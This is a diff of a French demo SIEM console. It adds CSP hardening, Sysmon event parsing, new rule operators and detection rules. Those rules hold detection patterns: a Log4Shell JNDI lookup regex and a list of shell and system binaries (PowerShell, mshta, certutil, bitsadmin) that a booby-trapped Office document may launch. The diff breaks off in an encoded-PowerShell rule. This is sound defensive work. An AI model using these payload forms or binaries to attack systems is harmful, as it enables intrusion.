@@ -3,74 +3,109 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'sha256-Zwz0X6riPnpc4uXXQtLeH6GNSsAlgXP5/FMjkRwBmQA=' 'sha256-5a/iM0+zT15rFFG+bXQHYquLfR6bM7uLo1pxDDj0TJ4=' 'sha256-NnIith1trOR+mCu8uIbkEPJOX/G1LegXHWjzdGRZmKI=' 'sha256-r9hQcjZMdIqUYalKKNW8zq+h2rHnGaXqoctR5Dc+b04=' 'sha256-Nm3F1Kr2ISMGmSFe9qODreUZWzTCln/OQ93jY9XGI88='; style-src 'sha256-tl6k2e8dOpNOFXeTUYTrTb25b63gF16klVF9ox9VKtg='; img-src 'self'; base-uri 'none'; form-action 'none'">
+<meta name="referrer" content="no-referrer">
 <title>mini-SIEM — console SOC</title>
 <style>
-  :root { --bg:#0f1116; --card:#171a21; --card2:#1c2029; --line:#272b36; --txt:#e6e8ee;
-          --muted:#9aa0ad; --accent:#378add; --crit:#e24b4a; --high:#ef9f27;
-          --medium:#378add; --low:#5dcaa5; --ok:#5dcaa5; }
-  * { box-sizing:border-box; }
-  body { margin:0; background:var(--bg); color:var(--txt);
-         font:14.5px/1.6 system-ui,-apple-system,Segoe UI,Roboto,sans-serif; }
-  .wrap { max-width:1080px; margin:0 auto; padding:24px 20px 72px; }
-  h1 { font-size:22px; margin:0 0 2px; font-weight:600; }
-  .sub { color:var(--muted); margin:0 0 18px; font-size:13px; }
-  a { color:var(--accent); }
-  button { background:var(--card); color:var(--txt); border:1px solid var(--line);
-           border-radius:8px; padding:7px 13px; font-size:13.5px; cursor:pointer; }
-  button:hover { border-color:var(--accent); }
-  button.primary { background:var(--accent); border-color:var(--accent); color:#fff; }
-  button.danger { color:var(--crit); border-color:rgba(226,75,74,.4); }
-  input, select, textarea { background:#0b0d12; color:var(--txt); border:1px solid var(--line);
-           border-radius:7px; padding:7px 9px; font-size:13.5px; font-family:inherit; }
-  textarea { width:100%; font-family:ui-monospace,Menlo,monospace; font-size:12.5px; }
-  .bar { display:flex; gap:10px; flex-wrap:wrap; align-items:center;
-         background:var(--card); border:1px solid var(--line); border-radius:12px;
-         padding:12px 14px; margin-bottom:16px; }
-  .tabs { display:flex; gap:6px; margin-bottom:16px; flex-wrap:wrap; }
-  .tab { padding:8px 16px; border-radius:8px; border:1px solid var(--line); background:var(--card);
-         cursor:pointer; font-size:13.5px; color:var(--muted); }
-  .tab.active { background:var(--accent); border-color:var(--accent); color:#fff; }
-  .panel { background:var(--card); border:1px solid var(--line); border-radius:12px; padding:16px 18px; }
-  .cards { display:flex; gap:10px; flex-wrap:wrap; margin-bottom:16px; }
-  .kpi { background:var(--card); border:1px solid var(--line); border-radius:12px; padding:12px 16px; min-width:92px; flex:1; }
-  .kpi .n { font-size:24px; font-weight:600; } .kpi .l { color:var(--muted); font-size:11.5px; text-transform:uppercase; letter-spacing:.04em; }
-  table { width:100%; border-collapse:collapse; }
-  th,td { text-align:left; padding:9px 8px; border-bottom:1px solid var(--line); vertical-align:top; }
-  th { color:var(--muted); font-size:11.5px; text-transform:uppercase; letter-spacing:.04em; }
-  tbody tr { cursor:pointer; }
-  tbody tr:hover { background:var(--card2); }
-  .sev { display:inline-block; padding:2px 9px; border-radius:999px; font-size:11.5px; font-weight:600; white-space:nowrap; }
-  .sev.critical{ background:rgba(226,75,74,.15); color:var(--crit); }
-  .sev.high{ background:rgba(239,159,39,.15); color:var(--high); }
-  .sev.medium{ background:rgba(55,138,221,.15); color:var(--medium); }
-  .sev.low{ background:rgba(93,202,165,.15); color:var(--low); }
-  .st { display:inline-block; padding:2px 9px; border-radius:6px; font-size:11.5px; border:1px solid var(--line); color:var(--muted); }
-  .st.encours { color:var(--high); border-color:rgba(239,159,39,.4); }
-  .st.contenu { color:var(--medium); border-color:rgba(55,138,221,.4); }
-  .st.resolu { color:var(--ok); border-color:rgba(93,202,165,.4); }
-  .st.fauxpositif { color:var(--muted); text-decoration:line-through; }
-  code { background:#0b0d12; border:1px solid var(--line); border-radius:6px; padding:1px 6px; font-size:12px; color:#cdd3e0; }
-  .att { font-family:ui-monospace,Menlo,monospace; color:var(--accent); font-size:12px; }
-  .cti { display:inline-block; padding:1px 7px; border-radius:6px; font-size:11px;
-         background:rgba(226,75,74,.12); color:#e24b4a; border:1px solid rgba(226,75,74,.3); }
-  pre { background:#0b0d12; border:1px solid var(--line); border-radius:8px; padding:10px; overflow:auto;
-        font-size:12px; color:#b9c0d0; margin:6px 0 0; white-space:pre-wrap; }
-  .hidden { display:none; }
-  .drawer-bg { position:fixed; inset:0; background:rgba(0,0,0,.5); display:flex; justify-content:flex-end; z-index:20; }
-  .drawer { width:min(620px,100%); height:100%; overflow:auto; background:var(--bg);
-            border-left:1px solid var(--line); padding:22px 24px; }
-  .drawer h2 { font-size:18px; margin:0 0 4px; } .drawer h3 { font-size:14px; margin:22px 0 8px; color:var(--muted); text-transform:uppercase; letter-spacing:.04em; font-weight:600; }
-  .row { display:flex; gap:10px; flex-wrap:wrap; align-items:center; margin-bottom:8px; }
-  .chk { display:flex; align-items:center; gap:8px; padding:6px 0; font-size:13.5px; }
-  .meta { color:var(--muted); font-size:12.5px; }
-  .grid2 { display:grid; grid-template-columns:1fr 1fr; gap:14px; }
-  .rulecard { padding:10px 12px; border:1px solid var(--line); border-radius:8px; margin-bottom:8px; cursor:pointer; }
-  .rulecard:hover { border-color:var(--accent); }
-  .rulecard.sel { border-color:var(--accent); background:var(--card2); }
-  label.fld { display:block; font-size:12px; color:var(--muted); margin:10px 0 3px; }
-  .err { color:var(--crit); font-size:12.5px; margin-top:6px; }
-  .foot { color:var(--muted); font-size:12px; margin-top:36px; border-top:1px solid var(--line); padding-top:14px; }
-  .close { float:right; cursor:pointer; color:var(--muted); font-size:20px; line-height:1; }
+/* mini-SIEM — console SOC. Feuille externe : la CSP interdit le style en ligne. */
+:root { --bg:#0f1116; --card:#171a21; --card2:#1c2029; --line:#272b36; --txt:#e6e8ee;
+        --muted:#9aa0ad; --accent:#378add; --crit:#e24b4a; --high:#ef9f27;
+        --medium:#378add; --low:#5dcaa5; --ok:#5dcaa5; }
+* { box-sizing:border-box; }
+body { margin:0; background:var(--bg); color:var(--txt);
+       font:14.5px/1.6 system-ui,-apple-system,Segoe UI,Roboto,sans-serif; }
+.wrap { max-width:1080px; margin:0 auto; padding:24px 20px 72px; }
+h1 { font-size:22px; margin:0 0 2px; font-weight:600; }
+.sub { color:var(--muted); margin:0 0 18px; font-size:13px; }
+a { color:var(--accent); }
+button { background:var(--card); color:var(--txt); border:1px solid var(--line);
+         border-radius:8px; padding:7px 13px; font-size:13.5px; cursor:pointer; }
+button:hover { border-color:var(--accent); }
+button.primary { background:var(--accent); border-color:var(--accent); color:#fff; }
+button.danger { color:var(--crit); border-color:rgba(226,75,74,.4); }
+input, select, textarea { background:#0b0d12; color:var(--txt); border:1px solid var(--line);
+         border-radius:7px; padding:7px 9px; font-size:13.5px; font-family:inherit; }
+textarea { width:100%; font-family:ui-monospace,Menlo,monospace; font-size:12.5px; }
+.bar { display:flex; gap:10px; flex-wrap:wrap; align-items:center;
+       background:var(--card); border:1px solid var(--line); border-radius:12px;
+       padding:12px 14px; margin-bottom:16px; }
+.tabs { display:flex; gap:6px; margin-bottom:16px; flex-wrap:wrap; }
+.tab { padding:8px 16px; border-radius:8px; border:1px solid var(--line); background:var(--card);
+       cursor:pointer; font-size:13.5px; color:var(--muted); }
+.tab.active { background:var(--accent); border-color:var(--accent); color:#fff; }
+.panel { background:var(--card); border:1px solid var(--line); border-radius:12px; padding:16px 18px; }
+.cards { display:flex; gap:10px; flex-wrap:wrap; margin-bottom:16px; }
+.kpi { background:var(--card); border:1px solid var(--line); border-radius:12px; padding:12px 16px; min-width:92px; flex:1; }
+.kpi .n { font-size:24px; font-weight:600; } .kpi .l { color:var(--muted); font-size:11.5px; text-transform:uppercase; letter-spacing:.04em; }
+table { width:100%; border-collapse:collapse; }
+th,td { text-align:left; padding:9px 8px; border-bottom:1px solid var(--line); vertical-align:top; }
+th { color:var(--muted); font-size:11.5px; text-transform:uppercase; letter-spacing:.04em; }
+tbody tr { cursor:pointer; }
+tbody tr:hover { background:var(--card2); }
+.sev { display:inline-block; padding:2px 9px; border-radius:999px; font-size:11.5px; font-weight:600; white-space:nowrap; }
+.sev.critical{ background:rgba(226,75,74,.15); color:var(--crit); }
+.sev.high{ background:rgba(239,159,39,.15); color:var(--high); }
+.sev.medium{ background:rgba(55,138,221,.15); color:var(--medium); }
+.sev.low{ background:rgba(93,202,165,.15); color:var(--low); }
+.st { display:inline-block; padding:2px 9px; border-radius:6px; font-size:11.5px; border:1px solid var(--line); color:var(--muted); }
+.st.encours { color:var(--high); border-color:rgba(239,159,39,.4); }
+.st.contenu { color:var(--medium); border-color:rgba(55,138,221,.4); }
+.st.resolu { color:var(--ok); border-color:rgba(93,202,165,.4); }
+.st.fauxpositif { color:var(--muted); text-decoration:line-through; }
+code { background:#0b0d12; border:1px solid var(--line); border-radius:6px; padding:1px 6px; font-size:12px; color:#cdd3e0; }
+.att { font-family:ui-monospace,Menlo,monospace; color:var(--accent); font-size:12px; }
+.cti { display:inline-block; padding:1px 7px; border-radius:6px; font-size:11px;
+       background:rgba(226,75,74,.12); color:#e24b4a; border:1px solid rgba(226,75,74,.3); }
+pre { background:#0b0d12; border:1px solid var(--line); border-radius:8px; padding:10px; overflow:auto;
+      font-size:12px; color:#b9c0d0; margin:6px 0 0; white-space:pre-wrap; }
+.hidden { display:none; }
+.drawer-bg { position:fixed; inset:0; background:rgba(0,0,0,.5); display:flex; justify-content:flex-end; z-index:20; }
+.drawer { width:min(620px,100%); height:100%; overflow:auto; background:var(--bg);
+          border-left:1px solid var(--line); padding:22px 24px; }
+.drawer h2 { font-size:18px; margin:0 0 4px; } .drawer h3 { font-size:14px; margin:22px 0 8px; color:var(--muted); text-transform:uppercase; letter-spacing:.04em; font-weight:600; }
+.row { display:flex; gap:10px; flex-wrap:wrap; align-items:center; margin-bottom:8px; }
+.chk { display:flex; align-items:center; gap:8px; padding:6px 0; font-size:13.5px; }
+.meta { color:var(--muted); font-size:12.5px; }
+.grid2 { display:grid; grid-template-columns:1fr 1fr; gap:14px; }
+.rulecard { padding:10px 12px; border:1px solid var(--line); border-radius:8px; margin-bottom:8px; cursor:pointer; }
+.rulecard:hover { border-color:var(--accent); }
+.rulecard.sel { border-color:var(--accent); background:var(--card2); }
+label.fld { display:block; font-size:12px; color:var(--muted); margin:10px 0 3px; }
+.err { color:var(--crit); font-size:12.5px; margin-top:6px; }
+.foot { color:var(--muted); font-size:12px; margin-top:36px; border-top:1px solid var(--line); padding-top:14px; }
+.close { float:right; cursor:pointer; color:var(--muted); font-size:20px; line-height:1; }
+
+/* Classes utilitaires : aucune déclaration de style dans le HTML (CSP style-src 'self') */
+.lbl { font-size:13px; }
+.push { margin-left:auto; }
+.grow { flex:1; }
+.w100 { width:100%; }
+.mt4 { margin-top:4px; } .mt8 { margin-top:8px; } .mt10 { margin-top:10px; }
+.m0 { margin:0; }
+.between { justify-content:space-between; }
+.panel.mb { margin-bottom:14px; }
+.panel.tight { padding:4px 18px; }
+#search { flex:1; min-width:180px; }
+#ruleList { margin-top:10px; max-height:460px; overflow:auto; }
+td.empty { padding:20px; }
+tr.static { cursor:default; }
+.acts { margin:6px 0; }
+.kpi .n.c-critical { color:var(--crit); } .kpi .n.c-high { color:var(--high); }
+.kpi .n.c-medium { color:var(--medium); } .kpi .n.c-low { color:var(--low); }
+.tab { font:inherit; font-size:13.5px; }
+.close { background:none; border:0; padding:0 4px; }
+.tablewrap { overflow-x:auto; }
+td.det { font-family:ui-monospace,Menlo,monospace; font-size:11.5px; color:#b9c0d0; word-break:break-all; min-width:180px; }
+tbody tr:focus-visible, .rulecard:focus-visible, button:focus-visible { outline:2px solid var(--accent); outline-offset:1px; }
+@media (max-width: 760px) {
+  .grid2 { grid-template-columns:1fr; }
+  .wrap { padding:18px 12px 56px; }
+  .drawer { padding:18px 16px; }
+}
+
+/* Page racine : simple redirection vers la console */
+body.redirect { min-height:100vh; display:flex; align-items:center; justify-content:center; font-size:15px; }
+
 </style>
 </head>
 <body>
@@ -81,39 +116,41 @@
      personnalisées sont conservés localement (localStorage).</p>
 
   <div class="bar">
-    <b style="font-size:13px">Source :</b>
-    <button class="primary" onclick="els.file.click()">Charger un fichier</button>
+    <b class="lbl">Source :</b>
+    <button class="primary" data-action="pick-file">Charger un fichier</button>
     <input type="file" id="file" class="hidden">
-    <button onclick="App.loadSample('auth')">Exemple SSH</button>
-    <button onclick="App.loadSample('web')">Exemple web</button>
-    <button onclick="App.loadSample('win')">Exemple Windows</button>
-    <button onclick="App.loadAll()">Tout charger</button>
-    <span class="meta" id="srcInfo" style="margin-left:auto"></span>
+    <button data-action="sample" data-sample="auth">Exemple SSH</button>
+    <button data-action="sample" data-sample="web">Exemple web</button>
+    <button data-action="sample" data-sample="fw">Exemple pare-feu</button>
+    <button data-action="sample" data-sample="win">Exemple Windows</button>
+    <button data-action="sample" data-sample="sysmon">Exemple Sysmon</button>
+    <button data-action="load-all">Tout charger</button>
+    <span class="meta push" id="srcInfo"></span>
   </div>
 
   <div class="tabs">
-    <div class="tab active" data-tab="detect" onclick="App.tab('detect')">Détection</div>
-    <div class="tab" data-tab="rules" onclick="App.tab('rules')">Règles</div>
-    <button style="margin-left:auto" onclick="App.exportIncident()">Exporter le rapport d'incident</button>
+    <button class="tab active" data-action="tab" data-tab="detect">Détection</button>
+    <button class="tab" data-action="tab" data-tab="rules">Règles</button>
+    <button class="push" data-action="export-incident">Exporter le rapport d'incident</button>
   </div>
 
   <!-- DÉTECTION -->
   <div id="tab-detect">
     <div class="cards" id="kpis"></div>
-    <div class="panel" style="margin-bottom:14px">
-      <div class="row" style="margin:0">
-        <input id="search" placeholder="Filtrer (IP, compte, règle, ATT&CK...)" style="flex:1; min-width:180px" oninput="App.renderAlerts()">
-        <label class="chk"><input type="checkbox" class="sevf" value="critical" checked onchange="App.renderAlerts()"> critical</label>
-        <label class="chk"><input type="checkbox" class="sevf" value="high" checked onchange="App.renderAlerts()"> high</label>
-        <label class="chk"><input type="checkbox" class="sevf" value="medium" checked onchange="App.renderAlerts()"> medium</label>
-        <label class="chk"><input type="checkbox" class="sevf" value="low" checked onchange="App.renderAlerts()"> low</label>
-        <label class="chk"><input type="checkbox" id="openOnly" onchange="App.renderAlerts()"> non résolues</label>
+    <div class="panel mb">
+      <div class="row m0" id="filters">
+        <input id="search" placeholder="Filtrer (IP, compte, règle, ATT&amp;CK...)">
+        <label class="chk"><input type="checkbox" class="sevf" value="critical" checked> critical</label>
+        <label class="chk"><input type="checkbox" class="sevf" value="high" checked> high</label>
+        <label class="chk"><input type="checkbox" class="sevf" value="medium" checked> medium</label>
+        <label class="chk"><input type="checkbox" class="sevf" value="low" checked> low</label>
+        <label class="chk"><input type="checkbox" id="openOnly"> non résolues</label>
       </div>
     </div>
-    <div class="panel" style="padding:4px 18px">
+    <div class="panel tight tablewrap">
       <table><thead><tr><th>Sévérité</th><th>Statut</th><th>Règle</th><th>Source</th>
         <th>Compte</th><th>Occur.</th><th>ATT&amp;CK</th></tr></thead>
-        <tbody id="rows"><tr><td colspan="7" class="meta" style="padding:20px">Charge une source pour lancer la détection.</td></tr></tbody></table>
+        <tbody id="rows"><tr><td colspan="7" class="meta empty">Charge une source pour lancer la détection.</td></tr></tbody></table>
     </div>
   </div>
 
@@ -121,47 +158,47 @@
   <div id="tab-rules" class="hidden">
     <div class="grid2">
       <div class="panel">
-        <div class="row" style="justify-content:space-between">
+        <div class="row between">
           <b>Règles (<span id="ruleCount">0</span>)</b>
-          <span><button onclick="App.newRule()">+ Nouvelle</button>
-            <button onclick="App.resetRules()">Réinitialiser</button></span>
+          <span><button data-action="new-rule">+ Nouvelle</button>
+            <button data-action="reset-rules">Réinitialiser</button></span>
         </div>
-        <div id="ruleList" style="margin-top:10px; max-height:460px; overflow:auto"></div>
-        <button onclick="App.exportRules()" style="margin-top:10px">Exporter les règles (JSON)</button>
+        <div id="ruleList"></div>
+        <button class="mt10" data-action="export-rules">Exporter les règles (JSON)</button>
       </div>
       <div class="panel">
         <b id="editTitle">Éditeur</b>
         <div id="editor" class="hidden">
-          <label class="fld">id</label><input id="e_id" style="width:100%">
-          <label class="fld">titre</label><input id="e_title" style="width:100%">
-          <div class="row" style="margin-top:4px">
-            <div style="flex:1"><label class="fld">type</label>
-              <select id="e_type" style="width:100%">
+          <label class="fld" for="e_id">id</label><input id="e_id" class="w100">
+          <label class="fld" for="e_title">titre</label><input id="e_title" class="w100">
+          <div class="row mt4">
+            <div class="grow"><label class="fld" for="e_type">type</label>
+              <select id="e_type" class="w100">
                 <option>match</option><option>threshold</option>
                 <option>sequence</option><option>baseline_hour</option></select></div>
-            <div style="flex:1"><label class="fld">sévérité</label>
-              <select id="e_level" style="width:100%">
+            <div class="grow"><label class="fld" for="e_level">sévérité</label>
+              <select id="e_level" class="w100">
                 <option>low</option><option>medium</option><option>high</option><option>critical</option></select></div>
           </div>
           <div class="row">
-            <div style="flex:1"><label class="fld">attack</label><input id="e_attack" style="width:100%"></div>
-            <div style="flex:1"><label class="fld">tactic</label><input id="e_tactic" style="width:100%"></div>
+            <div class="grow"><label class="fld" for="e_attack">attack</label><input id="e_attack" class="w100"></div>
+            <div class="grow"><label class="fld" for="e_tactic">tactic</label><input id="e_tactic" class="w100"></div>
           </div>
-          <label class="fld">paramètres (JSON : selection, group_by, window_seconds, count, distinct, precondition, trigger...)</label>
+          <label class="fld" for="e_params">paramètres (JSON : selection, filter, group_by, window_seconds, count, distinct, precondition, trigger...)</label>
           <textarea id="e_params" rows="9"></textarea>
           <div class="err hidden" id="e_err"></div>
-          <div class="row" style="margin-top:10px">
-            <button class="primary" onclick="App.saveRule()">Enregistrer et relancer</button>
-            <button class="danger" onclick="App.deleteRule()">Supprimer</button>
+          <div class="row mt10">
+            <button class="primary" data-action="save-rule">Enregistrer et relancer</button>
+            <button class="danger" data-action="delete-rule">Supprimer</button>
           </div>
-          <p class="meta" id="e_effect" style="margin-top:8px"></p>
+          <p class="meta mt8" id="e_effect"></p>
         </div>
         <p class="meta" id="editHint">Sélectionne une règle à gauche, ou crée-en une.</p>
       </div>
     </div>
   </div>
 
-  <div class="foot">mini-SIEM · console de démonstration. Données synthétiques. Moteur JS identique à la version Python.</div>
+  <div class="foot">mini-SIEM · console de démonstration. Données synthétiques. Moteur JS identique à la version Python (vérifié par les tests).</div>
 </div>
 
 <div id="drawer"></div>
@@ -243,19 +280,61 @@
   const EVTX_MAP = {4625:["win_logon","failure"],4624:["win_logon","success"],
     4672:["win_special_priv","info"],4720:["win_account_created","info"],
     4732:["win_group_add","info"],1102:["win_log_cleared","info"]};
+  // Sysmon : EventID -> catégorie de journal Sigma, reprise comme event_type
+  const SYSMON_MAP = {1:"process_creation", 3:"network_connection", 10:"process_access",
+    11:"file_event", 13:"registry_set", 22:"dns_query"};
+
+  const XML_ENT = {amp:"&", lt:"<", gt:">", quot:'"', apos:"'"};
+  function xmlText(s) {
+    return s.replace(/&(#x[0-9a-fA-F]+|#\d+|amp|lt|gt|quot|apos);/g, (m, e) =>
+      e[0] !== "#" ? XML_ENT[e] :
+      String.fromCodePoint(e[1] === "x" ? parseInt(e.slice(2), 16) : +e.slice(1)));
+  }
+  function bareUser(u) { return u ? u.split("\\").pop() : null; }
+
+  function sysmonEvent(eid, ts, host, data, raw) {
+    const ev = {timestamp: ts, source: "sysmon", event_type: SYSMON_MAP[eid], outcome: "info",
+                host: host, event_id: eid, raw: raw,
+                user: bareUser(data.User || data.SourceUser)};
+    if (eid === 1) {
+      ev.process = data.Image; ev.parent_process = data.ParentImage;
+      ev.command_line = data.CommandLine; ev.detail = data.IntegrityLevel;
+    } else if (eid === 3) {
+      ev.process = data.Image; ev.source_ip = data.SourceIp || null;
+      ev.dest_ip = data.DestinationIp || null;
+      ev.dest_port = /^\d+$/.test((data.DestinationPort || "").trim()) ? +data.DestinationPort : null;
+      ev.proto = data.Protocol; ev.target = data.DestinationHostname || null;
+    } else if (eid === 10) {
+      ev.process = data.SourceImage; ev.target = data.TargetImage;
+      ev.granted_access = (data.GrantedAccess || "").toLowerCase() || null;
+    } else if (eid === 11) {
+      ev.process = data.Image; ev.target = data.TargetFilename;
+    } else if (eid === 13) {
+      ev.process = data.Image; ev.target = data.TargetObject; ev.detail = data.Details;
+    } else if (eid === 22) {
+      ev.process = data.Image; ev.target = data.QueryName; ev.detail = data.QueryResults;
+    }
+    return ev;
+  }
 
   function parseEvtxBlock(block) {
-    const eidM = /<EventID>(\d+)<\/EventID>/.exec(block);
+    const eidM = /<EventID\b[^>]*>\s*(\d+)\s*<\/EventID>/.exec(block);
     if (!eidM) return null;
     const eid = +eidM[1];
-    if (!EVTX_MAP[eid]) return null;
-    const tM = /<TimeCreated SystemTime="([^"]+)"/.exec(block);
+    const prov = (/<Provider\b[^>]*\bName=["']([^"']*)["']/.exec(block) || [, ""])[1];
+    const chan = (/<Channel>([^<]*)<\/Channel>/.exec(block) || [, ""])[1];
+    const sysmon = /sysmon/i.test(prov + " " + chan);
+    if (!(sysmon ? SYSMON_MAP : EVTX_MAP)[eid]) return null;
+    const tM = /<TimeCreated\b[^>]*\bSystemTime=["']([^"']+)["']/.exec(block);
     if (!tM) return null;
-    const ts = new Date(tM[1].replace("Z", "Z"));
-    const host = (/<Computer>([^<]*)<\/Computer>/.exec(block) || [,"-"])[1];
+    const ts = new Date(tM[1].trim());
+    if (isNaN(ts)) return null;
+    const host = xmlText((/<Computer>([^<]*)<\/Computer>/.exec(block) || [,"-"])[1]) || "-";
     const data = {}; let d;
-    const RE_DATA = /<Data Name="([^"]+)">([^<]*)<\/Data>/g;
-    while ((d = RE_DATA.exec(block))) data[d[1]] = d[2];
+    const RE_DATA = /<Data Name=["']([^"']+)["']\s*>([^<]*)<\/Data>/g;
+    while ((d = RE_DATA.exec(block))) data[d[1]] = xmlText(d[2]);
+    const raw = block.split(/\s+/).filter(Boolean).join(" ");
+    if (sysmon) return sysmonEvent(eid, ts, host, data, raw);
     const [etype, outcome] = EVTX_MAP[eid];
     let user = data.TargetUserName || data.SubjectUserName || null;
     let ip = data.IpAddress || null;
@@ -265,18 +344,17 @@
     else if (eid === 4625 || eid === 4624) detail = data.LogonType;
     return {timestamp: ts, source: "windows", event_type: etype, outcome: outcome,
             host: host, source_ip: ip, user: user, event_id: eid, detail: detail,
-            raw: block.replace(/\s+/g, " ").slice(0, 300)};
+            raw: raw};
   }
 
+  // Accepte un fichier XML Windows (Sécurité ou Sysmon), un journal texte, ou un
+  // mélange des deux : les blocs <Event> sont extraits, le reste lu ligne à ligne.
   function parseText(text, year) {
     year = year || new Date().getFullYear();
     const events = [];
-    if (text.trimStart().startsWith("<")) {
-      const blocks = text.match(/<Event\b[\s\S]*?<\/Event>/g) || [];
-      for (const b of blocks) { const e = parseEvtxBlock(b); if (e) events.push(e); }
-      return events;
-    }
-    for (const line of text.split(/\r?\n/)) {
+    const RE_BLOCK = /<Event\b[\s\S]*?<\/Event>/g;
+    for (const b of text.match(RE_BLOCK) || []) { const e = parseEvtxBlock(b); if (e) events.push(e); }
+    for (const line of text.replace(RE_BLOCK, "\n").split(/\r?\n/)) {
       if (!line.trim()) continue;
       const e = parseUfw(line, year) || parseAuth(line, year) || parseApache(line);
       if (e) events.push(e);
@@ -294,10 +372,17 @@
         if (op === "contains") {
           const hay = String(value == null ? "" : value).toLowerCase();
           if (!asList(operand).some(o => hay.indexOf(String(o).toLowerCase()) >= 0)) return false;
+        } else if (op === "endswith") {
+          const hay = String(value == null ? "" : value).toLowerCase();
+          if (value == null || !asList(operand).some(o => hay.endsWith(String(o).toLowerCase()))) return false;
         } else if (op === "regex") {
           if (value == null || !new RegExp(operand, "i").test(String(value))) return false;
         } else if (op === "in") {
           if (asList(operand).indexOf(value) < 0) return false;
+        } else if (op === "gte") {
+          if (value == null || value < operand) return false;
+        } else if (op === "lte") {
+          if (value == null || value > operand) return false;
         } else return false;
       }
       return true;
@@ -307,8 +392,14 @@
   }
 
   function matches(ev, cond) {
-    for (const f of Object.keys(cond)) if (!matchField(ev[f], cond[f])) return false;
+    for (const f of Object.keys(cond || {})) if (!matchField(ev[f], cond[f])) return false;
     return true;
+  }
+
+  // Sélection (ou precondition / trigger) moins le filtre d'exclusion de la règle
+  function selected(ev, rule, key) {
+    if (!matches(ev, rule[key || "selection"])) return false;
+    return !(rule.filter && matches(ev, rule.filter));
   }
 
   function keyOf(ev, groupBy) { return groupBy.map(g => ev[g]).join("||"); }
@@ -326,7 +417,7 @@
   function runMatch(rule, events) {
     const gb = rule.group_by || ["source_ip", "user"];
     const buckets = {};
-    for (const e of events) if (matches(e, rule.selection))
+    for (const e of events) if (selected(e, rule))
       (buckets[keyOf(e, gb)] = buckets[keyOf(e, gb)] || []).push(e);
     return Object.values(buckets).map(g => alertFrom(rule, g));
   }
@@ -336,7 +427,7 @@
     const win = (rule.window_seconds || 300) * 1000;
     const thr = rule.count || 10, distinct = rule.distinct;
     const buckets = {};
-    for (const e of events) if (matches(e, rule.selection))
+    for (const e of events) if (selected(e, rule))
       (buckets[keyOf(e, gb)] = buckets[keyOf(e, gb)] || []).push(e);
     const reached = w => distinct
       ? new Set(w.map(e => e[distinct])).size >= thr : w.length >= thr;
@@ -360,8 +451,8 @@
     const ordered = events.slice().sort((a, b) => a.timestamp - b.timestamp);
     for (const e of ordered) {
       const k = keyOf(e, gb);
-      if (matches(e, rule.precondition)) (pending[k] = pending[k] || []).push(e);
-      else if (matches(e, rule.trigger)) {
+      if (selected(e, rule, "precondition")) (pending[k] = pending[k] || []).push(e);
+      else if (selected(e, rule, "trigger")) {
         const befores = (pending[k] || []).filter(p => e.timestamp - p.timestamp >= 0 && e.timestamp - p.timestamp <= win);
         if (befores.length >= minPre) { alerts.push(alertFrom(rule, befores.concat([e]))); pending[k] = []; }
       }
@@ -373,7 +464,7 @@
     const gb = rule.group_by || ["user"];
     const minSup = rule.min_support || 2;
     const byUser = {};
-    for (const e of events) if (matches(e, rule.selection))
+    for (const e of events) if (selected(e, rule))
       (byUser[keyOf(e, gb)] = byUser[keyOf(e, gb)] || []).push(e);
     const alerts = [];
     for (const group of Object.values(byUser)) {
@@ -404,7 +495,8 @@
     "203.0.113.66": {country:"Russie",city:"Moscou",lat:55.7558,lon:37.6173},
     "198.51.100.23": {country:"Chine",city:"Shanghai",lat:31.2304,lon:121.4737},
     "203.0.113.9":   {country:"Pays-Bas",city:"Amsterdam",lat:52.3676,lon:4.9041},
-    "198.51.100.77": {country:"Brésil",city:"São Paulo",lat:-23.5505,lon:-46.6333}
+    "198.51.100.77": {country:"Brésil",city:"São Paulo",lat:-23.5505,lon:-46.6333},
+    "203.0.113.200": {country:"Iran",city:"Téhéran",lat:35.6892,lon:51.3890}
   };
   function enrich(alerts) {
     for (const a of alerts) { const g = GEO[a.source_ip]; if (g) Object.assign(a, g); }
@@ -444,9 +536,9 @@
   function ctiDetectContacts(cti, events, existing) {
     const already = new Set(existing.map(a => a.source_ip).filter(Boolean));
     const byIp = {};
-    for (const e of events)
-      if (e.source_ip && cti.ip[e.source_ip] && !already.has(e.source_ip))
-        (byIp[e.source_ip] = byIp[e.source_ip] || []).push(e);
+    for (const e of events)                    // source puis destination (Sysmon 3)
+      for (const ip of new Set([e.source_ip, e.dest_ip]))
+        if (ip && cti.ip[ip] && !already.has(ip)) (byIp[ip] = byIp[ip] || []).push(e);
     const alerts = [];
     for (const ip of Object.keys(byIp)) {
       const evs = byIp[ip].sort((a,b)=>a.timestamp-b.timestamp);
@@ -464,7 +556,7 @@
   }
 
   root.MiniSIEM = {parseText, parseAuth, parseApache, parseUfw, parseEvtxBlock,
-                   runRules, matches, matchField, enrich, SEVERITY_ORDER, GEO,
+                   runRules, matches, matchField, selected, enrich, SEVERITY_ORDER, GEO,
                    ctiIndex, ctiEnrich, ctiDetectContacts};
   if (typeof module !== "undefined" && module.exports) module.exports = root.MiniSIEM;
 })(typeof window !== "undefined" ? window : globalThis);
@@ -714,6 +806,174 @@
         "regex": "(?:\\$\\{jndi:(?:ldap|ldaps|rmi|dns)|%24%7bjndi)"
       }
     }
+  },
+  {
+    "id": "SYSMON_OFFICE_SHELL",
+    "title": "Application Office qui lance un interpréteur de commandes",
+    "type": "match",
+    "level": "high",
+    "attack": "T1204.002",
+    "tactic": "Execution",
+    "description": "Word, Excel, PowerPoint ou Outlook démarre un shell, PowerShell ou un binaire système détourné (Sysmon 1). C'est la signature d'un document piégé : la macro lance la suite de l'attaque. Un processus enfant légitime d'Office (impression avec splwow64.exe, par exemple) ne déclenche rien.\n",
+    "selection": {
+      "event_type": "process_creation",
+      "parent_process": {
+        "endswith": [
+          "\\winword.exe",
+          "\\excel.exe",
+          "\\powerpnt.exe",
+          "\\outlook.exe",
+          "\\msaccess.exe",
+          "\\mspub.exe"
+        ]
+      },
+      "process": {
+        "endswith": [
+          "\\cmd.exe",
+          "\\powershell.exe",
+          "\\pwsh.exe",
+          "\\wscript.exe",
+          "\\cscript.exe",
+          "\\mshta.exe",
+          "\\rundll32.exe",
+          "\\regsvr32.exe",
+          "\\certutil.exe",
+          "\\bitsadmin.exe"
+        ]
+      }
+    },
+    "group_by": [
+      "host",
+      "user"
+    ]
+  },
+  {
+    "id": "SYSMON_PS_ENCODED",
+    "title": "PowerShell lancé avec une commande encodée",
+    "type": "match",
+    "level": "high",
+    "attack": "T1059.001",
+    "tactic": "Execution",
